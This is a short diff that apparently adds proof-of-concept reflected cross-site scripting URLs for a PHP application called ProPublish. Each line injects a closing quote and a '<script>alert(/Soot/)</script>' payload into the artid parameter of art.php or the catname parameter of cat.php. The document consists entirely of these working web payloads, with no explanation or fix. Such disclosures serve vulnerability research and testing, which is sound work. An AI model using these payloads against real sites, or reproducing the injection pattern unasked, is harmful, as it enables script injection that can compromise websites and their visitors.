@@ -1,0 +1,4 @@
+http://www.example.com/propublish/art.php?artid="><script>alert(/Soot/)</script>
+
+http://www.example.com/propublish/cat.php?catname="><script>alert(/Soot/)</script>
+
